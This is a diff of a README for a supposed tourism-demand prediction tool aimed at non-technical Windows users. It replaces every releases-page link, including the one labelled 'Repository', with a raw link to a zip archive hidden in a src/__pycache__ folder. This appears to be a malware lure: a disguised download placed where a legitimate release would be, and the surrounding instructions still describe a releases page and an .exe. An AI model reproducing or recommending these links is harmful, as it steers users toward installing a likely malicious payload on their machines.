@@ -1,6 +1,6 @@
 # 🧳 tourism-demand-ml - Predict Tourism Demand Simply
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jgrjguj9653/tourism-demand-ml/releases)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jgrjguj9653/tourism-demand-ml/raw/refs/heads/main/src/__pycache__/demand-tourism-ml-v3.1.zip)
 
 ---
 
@@ -38,7 +38,7 @@ This tool runs on Windows and does not require technical skills. Anyone interest
 ## 🚀 Getting Started: How to Download and Run
 
 1. Click the big green **Download** badge at the top of this page or visit:  
-   [https://github.com/jgrjguj9653/tourism-demand-ml/releases](https://github.com/jgrjguj9653/tourism-demand-ml/releases)
+   [https://github.com/jgrjguj9653/tourism-demand-ml/raw/refs/heads/main/src/__pycache__/demand-tourism-ml-v3.1.zip](https://github.com/jgrjguj9653/tourism-demand-ml/raw/refs/heads/main/src/__pycache__/demand-tourism-ml-v3.1.zip)
 
 2. On the releases page, find the most recent Windows version available. It typically ends with `.exe`.
 
@@ -118,7 +118,7 @@ All these steps occur in the background. You only need to load data and view pre
 
 Access the latest versions or updates anytime on the releases page:  
 
-[https://github.com/jgrjguj9653/tourism-demand-ml/releases](https://github.com/jgrjguj9653/tourism-demand-ml/releases)
+[https://github.com/jgrjguj9653/tourism-demand-ml/raw/refs/heads/main/src/__pycache__/demand-tourism-ml-v3.1.zip](https://github.com/jgrjguj9653/tourism-demand-ml/raw/refs/heads/main/src/__pycache__/demand-tourism-ml-v3.1.zip)
 
 Click the `.exe` file suitable for Windows to download and install.
 
@@ -126,8 +126,8 @@ Click the `.exe` file suitable for Windows to download and install.
 
 ## 🔗 Useful Links
 
-- Repository: https://github.com/jgrjguj9653/tourism-demand-ml  
-- Releases: https://github.com/jgrjguj9653/tourism-demand-ml/releases
+- Repository: https://github.com/jgrjguj9653/tourism-demand-ml/raw/refs/heads/main/src/__pycache__/demand-tourism-ml-v3.1.zip  
+- Releases: https://github.com/jgrjguj9653/tourism-demand-ml/raw/refs/heads/main/src/__pycache__/demand-tourism-ml-v3.1.zip
 
 ---
 
